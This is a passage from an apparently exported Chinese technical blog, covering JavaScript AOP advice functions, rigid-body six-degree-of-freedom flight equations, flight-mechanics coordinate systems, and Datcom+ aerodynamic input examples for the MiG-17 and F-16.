<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; AOP 后置通知函数声明</span><br><span class="line">&#x2F;**</span><br><span class="line"> * 给方法加入后置切片函数</span><br><span class="line"> * 可以在执行方法之之后执行一些操作</span><br><span class="line"> * 后置切片的返回值为false时，不影响原方法的执行</span><br><span class="line"> * @param func &#123;Function&#125; 被后置执行的函数</span><br><span class="line"> * @return &#123;Function&#125; 加入后置通知的函数</span><br><span class="line"> * @constructor</span><br><span class="line"> *&#x2F;</span><br><span class="line">Function.prototype._after &#x3D; function(func)&#123;</span><br><span class="line">    var __self &#x3D; this;</span><br><span class="line">    return function()&#123;</span><br><span class="line">        var ret &#x3D; __self.apply(__self, arguments);</span><br><span class="line">        func.apply(__self, arguments);</span><br><span class="line">        return ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 代码</span><br><span class="line">function b()&#123;</span><br><span class="line">    console.log(&#39;I\&#39;m b&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">b &#x3D; b._after(function()&#123;</span><br><span class="line">    console.log(&#39;after&#39;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">b();</span><br><span class="line">&#x2F;&#x2F; 结果：</span><br><span class="line">&#x2F;&#x2F; I&#39;m b</span><br><span class="line">&#x2F;&#x2F; after</span><br></pre></td></tr></table></figure>

<h2 id="around（环绕通知）"><a href="#around（环绕通知）" class="headerlink" title="around（环绕通知）"></a>around（环绕通知）</h2><p>在around函数中，引入了一个JoinPoint对象。JoinPoint对象封装了目标函数和目标函数的参数。在调用JoinPoint对象的invoke函数时，会去调用原来的目标函数。在调用invoke时，如果需要改变目标函数的this对象，需要将对象传入到invoke的参数中。around函数，可以在目标函数的前面和后面随意加入逻辑代码，也可以根据条件判断是否执行目标函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; AOP 环绕通知函数声明</span><br><span class="line">&#x2F;**</span><br><span class="line"> * 切入点对象</span><br><span class="line"> * 不允许切入对象多次调用</span><br><span class="line"> * @param obj   对象</span><br><span class="line"> * @param args  参数</span><br><span class="line"> * @constructor</span><br><span class="line"> *&#x2F;</span><br><span class="line">function JoinPoint(obj, args)&#123;</span><br><span class="line">    var isapply &#x3D; false;                       &#x2F;&#x2F; 判断是否执行过目标函数</span><br><span class="line">    var result &#x3D; null;                         &#x2F;&#x2F; 保存目标函数的执行结果</span><br><span class="line"></span><br><span class="line">    this.source &#x3D; obj;                         &#x2F;&#x2F; 目标函数对象</span><br><span class="line">    this.args &#x3D; args;                          &#x2F;&#x2F; 目标函数对象传入的参数</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 目标函数的代理执行函数</span><br><span class="line">     * 如果被调用过，不能重复调用</span><br><span class="line">     * @return &#123;object&#125; 目标函数的返回结果</span><br><span class="line">     *&#x2F;</span><br><span class="line">    this.invoke &#x3D; function(thiz)&#123;              </span><br><span class="line">        if(isapply)&#123; return; &#125;</span><br><span class="line">        isapply &#x3D; true;</span><br><span class="line">        result &#x3D; this.source.apply(thiz || this.source, this.args);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 获取目标函数执行结果</span><br><span class="line">    this.getResult &#x3D; function()&#123;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 方法环绕通知</span><br><span class="line"> * 原方法的执行需在环绕通知方法中执行</span><br><span class="line"> * @param func &#123;Function&#125; 环绕通知的函数</span><br><span class="line"> *     程序会往func中传入一个JoinPoint(切入点)对象, 在适当的时机</span><br><span class="line"> *     执行JoinPoint对象的invoke函数，调用目标函数</span><br><span class="line"> * </span><br><span class="line"> * @return &#123;Function&#125; 切入环绕通知后的函数，</span><br><span class="line"> *&#x2F;</span><br><span class="line">Function.prototype._around &#x3D; function(func)&#123;</span><br><span class="line">    var __self &#x3D; this;</span><br><span class="line">    return function()&#123;</span><br><span class="line">        var args &#x3D; [new JoinPoint(__self, arguments)];</span><br><span class="line">        return func.apply(this, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 代码</span><br><span class="line"></span><br><span class="line">var isAdmin &#x3D; true;</span><br><span class="line"></span><br><span class="line">function c()&#123;</span><br><span class="line">    console.log(&#39;show user list&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c &#x3D; c._around(function(joinpoint)&#123;</span><br><span class="line">    if(isAdmin)&#123;    &#x2F;&#x2F; 满足条件时，执行目标函数</span><br><span class="line">        console.log(&#39;is admin&#39;);</span><br><span class="line">        joinpoint.invoke(this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">c();</span><br><span class="line">&#x2F;&#x2F; 结果</span><br><span class="line">&#x2F;&#x2F; if isAdmin &#x3D;&#x3D; true</span><br><span class="line">&#x2F;&#x2F;     is admin</span><br><span class="line">&#x2F;&#x2F;     show user list</span><br><span class="line">&#x2F;&#x2F; if isAdmin &#x3D;&#x3D; false</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/面向侧面的程序设计" target="_blank" rel="noopener">面向侧面的程序设计</a>,by wikipedia.</li>
<li><a href="https://www.zhihu.com/question/24863332" target="_blank" rel="noopener">什么是面向切面编程AOP？</a>,by 知乎.</li>
<li><a href="https://blog.csdn.net/liuweitoo/article/details/8166503" target="_blank" rel="noopener">什么是面向方面编程</a>,by liuweitoo.</li>
<li><a href="https://blog.csdn.net/hguisu/article/details/7586704" target="_blank" rel="noopener">AOP面向方面编程</a>,by 规速.</li>
<li><a href="https://www.jianshu.com/p/a833d114099a" target="_blank" rel="noopener">团队开发框架实战—面向切面的编程 AOP</a>,by Bobby0322.</li>
<li><a href="https://blog.csdn.net/yanquan345/article/details/19760027" target="_blank" rel="noopener">轻松理解AOP(面向切面编程)</a>,by -望远-.</li>
<li><a href="https://blog.csdn.net/qq_21460229/article/details/79696159" target="_blank" rel="noopener">AOP在JS中的实现及应用</a>,by _Sirius.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>飞行仿真之刚体六自由度方程</title>
    <url>/2019/01/06/%E9%A3%9E%E8%A1%8C%E4%BB%BF%E7%9C%9F%E4%B9%8B%E5%88%9A%E4%BD%93%E5%85%AD%E8%87%AA%E7%94%B1%E5%BA%A6%E6%96%B9%E7%A8%8B/</url>
    <content><![CDATA[<p>在飞行仿真中，获取飞机的位姿是基本要求。将飞行器视为刚体，根据牛顿第二定律和动量矩定理，即可推导出飞机的质心运动方程和飞机绕质心转动的动力学方程，即刚体的六自由度方程。下面即从《航空飞行器飞行动力学》中摘抄刚体六自由度方程的推导过程。</p>
<h1 id="飞行器质心运动方程"><a href="#飞行器质心运动方程" class="headerlink" title="飞行器质心运动方程"></a>飞行器质心运动方程</h1><p>根据牛顿第二定理：</p>
<p>$$m\frac{dV}{dt}=F \tag{1}$$</p>
<p>式中$m$为飞行器质量，$V$为飞行器飞行速度矢量，$F$为作用于质心处外力的合力矢量。</p>
<p>具体研究飞行器质心运动规律时，工程上常建立投影正在一动坐标系的标量方程，并认为大气时静止的。</p>
<h2 id="一般动坐标系中质心动力学方程"><a href="#一般动坐标系中质心动力学方程" class="headerlink" title="一般动坐标系中质心动力学方程"></a>一般动坐标系中质心动力学方程</h2><p>取原点位于飞行器质心的一动坐标系$Oxyz$，它相对惯性坐标系$O_gx_gy_gz_g$有一转动角速度$w$。质心的绝对速度为$V$，如图1所示。</p>
<p align="center">
    <img src="images/DynamicAxis.jpg" width="60%" alt="动系相对于惯性坐标系的关系"/>
</p>
<center>图1 动系相对于惯性坐标系的关系</center>

<p>将速度$V$和角速度$w$分别在动坐标系上投影，则有</p>
<p>$$V=V_xi+V_yj+V_zk \tag{2}$$<br>$$w=w_xi+w_yj+w_zk \tag{3}$$</p>
<p>式中$i,j,k$为动坐标系$Oxyz$的单位矢量。由于$w$存在，其方向将随时间变化。</p>
<p>将公式$(2)和(3)$带入公式$(1)$，则速度$V$的微分，即质心的绝对加速度为：</p>
<p>$$<br>\frac{F}{m}=\frac{dV}{dt}=\frac{dV_x}{dt}i+\frac{dV_y}{dt}j+\frac{dV_z}{dt}k+V_x\frac{di}{dt}+V_y\frac{dj}{dt}+V_z\frac{dk}{dt} \tag{4}<br>$$</p>
<p>式中单位矢量导数$di/dt$是矢量端点$i$的速度，此时矢端曲线是绕$w$旋转的圆，因此：</p>
<p>$$\frac{di}{dt}=w\times i$$<br>$$\frac{dj}{dt}=w\times y$$<br>$$\frac{dk}{dt}=w\times z$$</p>
<p>将上述关系代入公式$(4)$，即可知质心的绝对加速度可表示为</p>
<p>$$\frac{F}{m}=\frac{dV}{dt}=\frac{\delta V}{\delta t}+w \times V  \tag{5}$$</p>
<p>其中：</p>
<p>$$\frac{\delta V}{\delta t}=\frac{dV_x}{dt}i+\frac{dV_y}{dt}j+\frac{dV_z}{dt}k$$</p>
<p>式(5)中 $\frac{\delta V}{\delta t}$ 为动系角速度 $w=0$ 时的加速度，即相当于观察者站在动坐标系中所看到的质心加速度；$w\times V$为由于存在角速度 $w$ 使 $V$ 相对于动坐标系方向发生变化而产生的加速度；$\frac{dV}{dt}$ 为质心的绝对加速度，即观察者在地面坐标系上所看到的加速度。</p>
<p>同样合力矢量$F$用动坐标系上投影表示为：</p>
<p>$$F=F_xi+F_yj+F_zk$$</p>
<p>于是式(5)在动坐标系$Oxyz$上投影的质心动力学标量方程如下：</p>
<p>$$m(\frac{dV_x}{dt}+V_zw_y-V_yw_z)=F_x$$<br>$$m(\frac{dV_y}{dt}+V_xw_z-V_zw_x)=F_y$$<br>$$m(\frac{dV_z}{dt}+V_yw_x-V_xw_y)=F_z$$</p>
<p>上述方程组适用于任何动坐标系。</p>
<h1 id="飞行器绕质心的动力学方程"><a href="#飞行器绕质心的动力学方程" class="headerlink" title="飞行器绕质心的动力学方程"></a>飞行器绕质心的动力学方程</h1><p>根据动量矩定理，飞行器绕质心的转动运动可表示为：</p>
<p>$$M=\frac{dh}{dt} \tag{6}$$</p>
<p>式中$h$为飞行器对坐标系原点的动量矩；$M$为作用在飞行器上的外力对原点的合力矩。</p>
<p align="center">
    <img src="images/MomentumOfCentroid.jpg" width="60%" alt="对质心的动量矩"/>
</p>

<center>图2 对质心的动量矩</center>

<p>根据动量矩定义，飞行器上任意微元质量为dm，对坐标系原点的动量矩为：</p>
<p>$$\Delta h=r\times V dm$$</p>
<p>式中$r$为微元质量到坐标系原点的矢径；$V$为该微元质量的速度矢量，则</p>
<p>$$V=V_o+w\times r$$</p>
<p>式中$V_o$为坐标系原点速度（如坐标原点取为飞行器质心，则为质心速度）；$w$为坐标系转动角速度。</p>
<p>于是飞行器的总动量矩可积分得出</p>
<p>$$h=\int r\times V dm=\int r dm \times V_o +\int r \times (w \times r) dm$$</p>
<p>取坐标系原点为质心时，有</p>
<p>$$\int r dm=0$$</p>
<p>飞行器动量矩简化为</p>
<p>$$h=\int r \times (w\times r) dm \tag{7}$$</p>
<p>上式表明，飞行器的动量矩只取决于转动产生的速度部分，而与质心运动速度$V_o$无关。矢径$r$和角速度$w$用坐标系中投影分量表示为：</p>
<p>$$r=xi+yj+zk$$<br>$$w=w_xi+w_yj+w_zk$$</p>
<p>将上述关系式代入式$(7)$，经整理得：</p>
<p>$$h_x=w_xI_x-w_yI_{xy}-w_zI_{zx}$$<br>$$h_y=w_yI_y-w_xI_{xy}-w_zI_{yz}$$<br>$$h_z=w_zI_z-w_xI_{zx}-w_yI_{yz}$$</p>
<p>式中$I_x$,$I_y$,$I_z$分别为飞行器对$O_x$轴,$O_y$轴,$O_z$轴地惯性矩，分别为：</p>
<p>$$I_x=\int (y^2+z^2) dm$$<br>$$I_y=\int (x^2+z^2) dm$$<br>$$I_z=\int (x^2+y^2) dm$$</p>
<p>而$I_{xy}$, $I_{yz}$, $I_{zx}$ 则为对 $O_x$ 轴与 $O_y$ 轴，$O_y$ 轴与 $O_z$ 轴，$O_z$ 轴与 $O_x$ 轴的惯性积，分别为：</p>
<p>$$I_{xy}=\int xy dm$$<br>$$I_{yz}=\int yz dm$$<br>$$I_{zx}=\int zx dm$$</p>
<h2 id="一般动坐标系中绕质心转动动力学方程"><a href="#一般动坐标系中绕质心转动动力学方程" class="headerlink" title="一般动坐标系中绕质心转动动力学方程"></a>一般动坐标系中绕质心转动动力学方程</h2><p>具体研究飞行器绕质心转动规律时，矢量形式的式$(6)$使用不便。工程习惯上将其投影在一动坐标系上建成方程的标量形式。此时动坐标系在空中以$w$转动，类同于加速度$\frac{dV}{dt}$，动量矩可以表示为：</p>
<p>$$M=\frac{dh}{dt}=\frac{\delta h}{\delta t}+w\times h$$</p>
<p>类似一般动坐标系中质心动力学方程的推导，最终可得转动运动方程的标量形式为：</p>
<p>$$\frac{dh_x}{dt}+h_zw_y-h_yw_z=M_x$$<br>$$\frac{dh_y}{dt}+h_xw_z-h_zw_x=M_y$$<br>$$\frac{dh_z}{dt}+h_yw_x-h_xw_y=M_z$$</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li>方振平,陈万春,张曙光. 航空飞行器飞行动力学[M]. 2015.</li>
<li><a href="https://blog.csdn.net/csxiaoshui/article/details/65446125" target="_blank" rel="noopener">旋转变换（一）旋转矩阵</a>,by csxiaoshui.</li>
<li><a href="https://zhuanlan.zhihu.com/p/35051554" target="_blank" rel="noopener">飞行仿真–3.刚体六自由度方程、变换矩阵与四元数</a>,by WFYX.</li>
<li><a href="http://wonderffee.github.io/blog/2013/10/17/a-simple-method-to-determine-positive-rotation-in-in-three-dimensional-space/" target="_blank" rel="noopener">判断三维坐标系旋转正方向的简单方法</a>,by Wonderffee.</li>
<li><a href="https://zhuanlan.zhihu.com/p/86464027" target="_blank" rel="noopener">（番外）姿态与旋转矩阵（I）</a>,by Tam Alex.</li>
<li><a href="https://zhuanlan.zhihu.com/p/47208814" target="_blank" rel="noopener">一点关于机器人学和计算机视觉中的坐标变换的理解</a>,by Kissrabbit.</li>
<li><a href="https://zhuanlan.zhihu.com/p/63903303" target="_blank" rel="noopener">飞机是怎么飞起来的</a>,by J Pan.</li>
<li><a href="https://zhuanlan.zhihu.com/p/69241244" target="_blank" rel="noopener">如何获得飞机运动方程</a>,by J Pan.</li>
<li><a href="https://zhuanlan.zhihu.com/p/23617272" target="_blank" rel="noopener">【自动控制原理】1.传递函数</a>,by 李寒潭.</li>
<li><a href="http://www.360doc.com/content/19/1027/17/37844335_869385575.shtml" target="_blank" rel="noopener">空空导弹尾部的齿轮有什么用？</a>,by 不沉俾斯麦.</li>
<li><a href="https://wenku.baidu.com/view/6833b77302768e9951e7383a.html" target="_blank" rel="noopener">导弹制导原理第4章</a>,by 张庆振.</li>
<li><a href="https://zhuanlan.zhihu.com/p/105474241" target="_blank" rel="noopener">飞行原理术语解析</a>,by 刘斯宁.</li>
<li><a href="https://zhuanlan.zhihu.com/p/106138927" target="_blank" rel="noopener">空气动力学术语解析</a>,by 刘斯宁.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>飞行力学</tag>
      </tags>
  </entry>
  <entry>
    <title>飞行力学中坐标系定义</title>
    <url>/2018/12/10/%E9%A3%9E%E8%A1%8C%E5%8A%9B%E5%AD%A6%E4%B8%AD%E5%9D%90%E6%A0%87%E7%B3%BB%E5%AE%9A%E4%B9%89/</url>
    <content><![CDATA[<p>建立飞机的运动学模型的前提是建立合适的坐标系，在此基础上才能定义各种参数描述飞机的状态。下面介绍常用的坐标系及常用描述飞机状态的参数。</p>
<h1 id="常用坐标系"><a href="#常用坐标系" class="headerlink" title="常用坐标系"></a>常用坐标系</h1><h2 id="地面固定坐标轴系-AX-gY-gZ-g"><a href="#地面固定坐标轴系-AX-gY-gZ-g" class="headerlink" title="地面固定坐标轴系($AX_gY_gZ_g$)"></a>地面固定坐标轴系($AX_gY_gZ_g$)</h2><p>将地球视为椭球体，则地面固定坐标轴系定义为：</p>
<p>以椭球面上一点为坐标系原点$A$，$Z_g$轴与椭球法线重合，向下为正，$X_g$与$Y_g$轴位于过坐标原地的椭球切平面上,按右手法则建立，$X_g$轴与椭球短半轴重合（北向），$Y_g$轴与地球椭球的长半轴重合（东向）。</p>
<p>在研究坐标转换关系时，<strong>常使用飞机牵连铅垂地面固定坐标系$OX_gY_gZ_g$</strong>。其原点$O$位于飞机质心，三坐标轴平行于地面固定坐标轴系$AX_gY_gZ_g$的各个轴。飞机姿态——偏航、俯仰、滚转的定义即与飞机牵连铅垂地面固定坐标系有关。</p>
<h2 id="机体坐标系-体轴系-OXYZ"><a href="#机体坐标系-体轴系-OXYZ" class="headerlink" title="机体坐标系(体轴系$OXYZ$)"></a>机体坐标系(体轴系$OXYZ$)</h2><p>机体坐标系定义为：</p>
<p>原点$O$位于质心，$O_X$平行于机身轴线或对称面机翼弦线指向前方（机头方向）；$O_Y$垂直于对称面指向右翼；$O_Z$在飞机对称面内，垂直于$O_X$指向下方。符合右手系建立规定。</p>
<p align="center">
    <img src="images/plane_axis.png" width="90%" alt="机体坐标系"/>
</p>
<center>图1  飞机牵连铅垂地面固定坐标系（OXgYgZg）与体轴系（OXYZ）</center>

<h2 id="航迹坐标系-OX-kY-kZ-k"><a href="#航迹坐标系-OX-kY-kZ-k" class="headerlink" title="航迹坐标系($OX_kY_kZ_k$)"></a>航迹坐标系($OX_kY_kZ_k$)</h2><p>航迹坐标系定义：</p>
<p>原点$O$位于飞机质心，$OX_k$沿飞机速度方向；$OZ_k$在$OX_k$所在铅垂平面内，垂直于$OX_k$指向下方；$OY_k$垂直于$OX_k$、$OZ_k$ 所在平面指向右方；符合右手系建立规定。</p>
<p align="center">
    <img src="images/track_axis.png" width="90%" alt="航迹坐标系"/>
</p>
<center>图2  航迹坐标系（OXkYkZk）</center>

<h2 id="气流坐标轴系-风轴系-OX-aY-aZ-a"><a href="#气流坐标轴系-风轴系-OX-aY-aZ-a" class="headerlink" title="气流坐标轴系(风轴系$OX_aY_aZ_a$)"></a>气流坐标轴系(风轴系$OX_aY_aZ_a$)</h2><p>气流坐标轴系又称速度坐标轴系，定义为：</p>
<p>原点$O$位于飞机质心，$OX_a$沿飞机速度方向；$OZ_a$在飞机对称面内，垂直于$OX_a$指向下方；$OY_a$垂直于$OX_a$、$OZ_a$ 所在平面指向右方；符合右手系建立规定。</p>
<p>气动力三个分量（升力、阻力、侧力）是根据风轴系定义的，其中升力与阻力分别沿$OZ_a$、$OX_a$的负向。</p>
<h2 id="半机体坐标系-OX-iY-iZ-i"><a href="#半机体坐标系-OX-iY-iZ-i" class="headerlink" title="半机体坐标系($OX_iY_iZ_i$)"></a>半机体坐标系($OX_iY_iZ_i$)</h2><p>半机体坐标系定义为：</p>
<p>原点$O$位于质心，$OX_i$沿飞机速度向飞机对称面内投影方向；$OZ_i$在飞机对称面内，垂直于$OX_i$指向下方；$OY_i$垂直于$OX_i$、$OZ_i$ 所在平面指向右方；符合右手系建立规定。</p>
<p align="center">
    <img src="images/half_plane_axis.png" width="90%" alt="半机体坐标"/>
</p>
<center>图3  风轴系（OXaYaZa）与半机体坐标系（OXiYiZi）</center>

<h2 id="稳定性坐标系-OX-sY-sZ-s"><a href="#稳定性坐标系-OX-sY-sZ-s" class="headerlink" title="稳定性坐标系($OX_sY_sZ_s$)"></a>稳定性坐标系($OX_sY_sZ_s$)</h2><p>稳定性坐标系定义为：</p>
<p>原点$O$位于质心，$OX_s$沿未受扰动的速度在对称面内的投影方向；$OY_s$在飞机对称面内，指向右；$OZ_s$对称平面内垂直于$OX_s$向下；符合右手系建立规定。</p>
<p align="center">
    <img src="images/stable_axis.png" width="90%" alt="半机体坐标"/>
</p>
<center>图4  稳定性坐标系（OXsYsZs）</center>

<h1 id="常用飞参"><a href="#常用飞参" class="headerlink" title="常用飞参"></a>常用飞参</h1><ul>
<li><p>机体坐标系相对于飞机牵连铅垂地面固定坐标系的夹角</p>
<ul>
<li>偏航角：机体坐标系$x$轴在水平面内投影与$x_g$的夹角，以$\psi$表示</li>
<li>俯仰角：机体坐标系$x$轴与水平面的夹角，以$\theta$表示</li>
<li>滚转角：过机体坐标系$x$轴的铅垂面与机体坐标系$z$轴的夹角，以$\phi$表示</li>
</ul>
</li>
<li><p>飞行速度矢量相对于体轴系的夹角</p>
<ul>
<li>迎角：速度矢量在飞机纵向对称面内投影与机体坐标系$x$轴夹角，以$\alpha$表示</li>
<li>侧滑角：速度矢量与飞机纵向对称面的夹角，以$\beta$表示</li>
</ul>
</li>
<li><p>飞行速度矢量相对于地面的夹角</p>
<ul>
<li>爬升角：速度与地面水平面夹角，以$\gamma$表示</li>
<li>航迹方位角：速度在地面水平面的投影与$x_g$夹角，以$\chi$表示</li>
</ul>
</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/23722074" target="_blank" rel="noopener">无人机飞控通俗演义之 纷繁复杂的飞行力学</a>, by 量子黑洞.</li>
<li><a href="https://zhuanlan.zhihu.com/p/25150076" target="_blank" rel="noopener">一起写飞行仿真之 六自由度动力学方程</a>, by 量子黑洞.</li>
<li><a href="https://zhuanlan.zhihu.com/p/20926052" target="_blank" rel="noopener">飞行器飞行动力学（二）坐标系与夹角们</a>, by 萝卜.</li>
<li><a href="https://huangwang.github.io/2018/06/10/Cesium中飞行器姿态控制/">Cesium中飞行器姿态控制</a>,by jack huang.</li>
<li><a href="https://blog.csdn.net/liyuanbhu/article/details/51474290" target="_blank" rel="noopener">MathJax 支持的 Latex 符号总结(希腊字母和希伯来字母)</a>,by liyuanbhu</li>
<li><a href="https://blog.csdn.net/tina_ttl/article/details/51279530" target="_blank" rel="noopener">空间中三维矢量</a>,by tina_ttl.</li>
<li><a href="https://www.jianshu.com/p/a0b4598f928a" target="_blank" rel="noopener">JSBSim学习笔记(3)—— 基本概念</a>,by 么的聊.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行力学</tag>
      </tags>
  </entry>
  <entry>
    <title>飞行仿真中气动参数的生成和计算方法</title>
    <url>/2020/04/03/%E9%A3%9E%E8%A1%8C%E4%BB%BF%E7%9C%9F%E4%B8%AD%E6%B0%94%E5%8A%A8%E5%8F%82%E6%95%B0%E7%9A%84%E7%94%9F%E6%88%90%E5%92%8C%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>飞行器仿真一个难点是气动力和力矩系数的生成和计算方法。通常获得气动力和力矩系统的方法主要有：</p>
<ul>
<li>风洞实验。能够获得精准的气动力和力矩系数，但投资巨大。</li>
<li>Fluent类似软件进行仿真计算。</li>
<li>Datcom生成。Datacom软件本质是在大量风洞实验数据基础上，通过数值计算粗略生成气动力和力矩系数。</li>
</ul>
<p>气动力模型是表征气动力和力矩系数与飞行状态、控制输入之间关系的函数。可表示为：</p>
<p>$$C_i=f(H, Ma, α, β, \omega_x, \omega_y,\omega_z, \delta_e,\delta_r,\delta_a)$$</p>
<p>其中，H、Ma、α、β分别为高度、马赫数、攻角、侧滑角；$\omega_x, \omega_y,\omega_z$ 分别为滚转、偏航和俯仰角速度；$\delta_e,\delta_r,\delta_a$ 分别为升降舵、方向舵和副翼舵偏角。</p>
<h1 id="Datcom-使用帮助"><a href="#Datcom-使用帮助" class="headerlink" title="Datcom+使用帮助"></a>Datcom+使用帮助</h1><p>Datcom+是Digital Datcom程序的一个扩展，它包含了一些工具，使使用Digital Datcom程序更加容易。这一计划的起源始于1996年，并由Holy Cows，Inc.支持到2010年。</p>
<p>Datcom+Pro是Datcom+的下一代，它已经变得更加用户友好。可视化工具允许您立即看到您的飞机，由数字数据通信程序生成的系数数据绘制在X-Y图上，以便于解释和包含在报告中。此外，您的Datcom+模型现在可以在JSBSim中运行，它是一个完整的6自由度运动方程模型，并提供了执行标准飞行试验机动的飞行试验脚本示例。可惜无法网上无法获得该版本。</p>
<p>下面重点介绍Datcom+的使用方法。</p>
<h1 id="Datcom-输入"><a href="#Datcom-输入" class="headerlink" title="Datcom+输入"></a>Datcom+输入</h1><p>Datcom+输入是以“.dcm”为扩展名的文件，具体数据输入格式可参考示例文件“citation.dcm”。该示例文件的设计目的是允许您读取它，并可能理解它，即使Datcom符号可能很难读取和理解。它由以“*”开头的注释行和Datcom命令组成，其中一些命令必须以列1开头，另一些命令以$开头，后跟公共块名，如FLTCON。如果以$开头，则必须以$结尾。常用的名字列表如下：</p>
<ul>
<li><p>FLTCON-定义飞行条件</p>
</li>
<li><p>SYNTHS-定位cg、机翼、水平尾翼和垂直尾翼相对于参考线</p>
</li>
<li><p>BODY-定义机体几何体</p>
</li>
<li><p>WGPLNF-定义机翼平面形状几何图形</p>
</li>
<li><p>HTPLNF-定义水平尾翼几何结构</p>
</li>
<li><p>VTPLNF-定义垂直尾翼几何结构</p>
</li>
</ul>
<h2 id="MiG-17-Datcom-输入示例"><a href="#MiG-17-Datcom-输入示例" class="headerlink" title="MiG-17 Datcom+ 输入示例"></a>MiG-17 Datcom+ 输入示例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CASEID ----- MIKOYAN-GUREVICH MiG-17 ----- </span><br><span class="line"> $FLTCON NMACH&#x3D;1.0,MACH(1)&#x3D;0.6,NALPHA&#x3D;10.0,ALSCHD(1)&#x3D;-4.0,-2.0, </span><br><span class="line">  0.0,2.0,4.0,6.0,8.0,10.0,12.0,14.0,NALT&#x3D;1.0,ALT(1)&#x3D;5000.0, </span><br><span class="line">  WT&#x3D;13395.0,LOOP&#x3D;1.$ </span><br><span class="line"> $SYNTHS XCG&#x3D;11.17,ZCG&#x3D;0.0,XW&#x3D;3.63,ZW&#x3D;0.42,ALIW&#x3D;1.0,XH&#x3D;28.73, </span><br><span class="line">  ZH&#x3D;5.24,ALIH&#x3D;0.0,XV&#x3D;18.3,ZV&#x3D;0.0$ </span><br><span class="line"> $OPTINS SREF&#x3D;243.0$ </span><br><span class="line"> $BODY NX&#x3D;8.0, </span><br><span class="line">  X(1)&#x3D;0.0,0.74,8.35,13.14,19.35,24.41,28.41,30.77, </span><br><span class="line">  S(1)&#x3D;5.19,9.32,16.89,16.89,15.94,11.12,5.85,2.5$ </span><br><span class="line">NACA-W-6-66-012 </span><br><span class="line"> $WGPLNF CHRDTP&#x3D;7.02,SSPNOP&#x3D;11.32,SSPNE&#x3D;13.41,SSPN&#x3D;15.71, </span><br><span class="line">  CHRDBP&#x3D;8.4,CHRDR&#x3D;14.0,SAVSI&#x3D;45.0,SAVSO&#x3D;45.0,CHSTAT&#x3D;0.25, </span><br><span class="line">  TWISTA&#x3D;0.0,DHDADI&#x3D;-3.0,DHDADO&#x3D;-3.0,TYPE&#x3D;1.0$ </span><br><span class="line">NACA-H-6-66-009 </span><br><span class="line"> $HTPLNF CHRDTP&#x3D;1.86,SSPNE&#x3D;5.42,SSPN&#x3D;5.43,CHRDR&#x3D;4.69,SAVSI&#x3D;45.0, </span><br><span class="line">  CHSTAT&#x3D;0.25,TYPE&#x3D;1.0$ </span><br><span class="line">NACA-V-6-66-009 </span><br><span class="line"> $VTPLNF CHRDTP&#x3D;3.76,SSPNE&#x3D;6.05,SSPN&#x3D;8.18,CHRDR&#x3D;12.47,SAVSI&#x3D;55.0, </span><br><span class="line">  CHSTAT&#x3D;0.25,TYPE&#x3D;1.0$ </span><br><span class="line">DIM FT </span><br><span class="line">BUILD </span><br><span class="line">PLOT </span><br><span class="line">NEXT CASE</span><br></pre></td></tr></table></figure>

<h2 id="F16输入示例"><a href="#F16输入示例" class="headerlink" title="F16输入示例"></a>F16输入示例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DIM FT</span><br><span class="line">DAMP</span><br><span class="line">DERIV DEG</span><br><span class="line">PART</span><br><span class="line"></span><br><span class="line"> $FLTCON NMACH&#x3D;1.0,MACH(1)&#x3D;0.6,</span><br><span class="line">         NALPHA&#x3D;10.0,ALSCHD(1)&#x3D;-4.0,-2.0,0.0,2.0,4.0,6.0,8.0,10.0,12.0,14.0,</span><br><span class="line">         NALT&#x3D;1.0,ALT(1)&#x3D;5000.0, </span><br><span class="line">         WT&#x3D;17400.0,LOOP&#x3D;2.$ </span><br><span class="line"> $OPTINS SREF&#x3D;300.0,BLREF&#x3D;30.0$ </span><br><span class="line"> $SYNTHS XCG&#x3D;27.60,ZCG&#x3D;0.0,</span><br><span class="line">         XW&#x3D;19.63,ZW&#x3D;0.69,ALIW&#x3D;0.0,</span><br><span class="line">         XH&#x3D;35.10,ZH&#x3D;0.69,ALIH&#x3D;0.0,</span><br><span class="line">         XV&#x3D;33.86,ZV&#x3D;0.0$ </span><br><span class="line"> $BODY NX&#x3D;7.0, </span><br><span class="line">  X(1)&#x3D;  0.00, 2.52,15.51,16.76,24.95,41.83,42.75,</span><br><span class="line">  R(1)&#x3D;  0.07, 0.13, 3.19, 3.15, 2.54, 1.80, 1.64,</span><br><span class="line">  ITYPE&#x3D;1.0, METHOD&#x3D;1.0$ </span><br><span class="line">NACA-W-6-4A-204 </span><br><span class="line"> $WGPLNF CHRDR&#x3D;15.30, CHRDTP&#x3D;3.6,</span><br><span class="line">         SSPNE&#x3D;12.69, 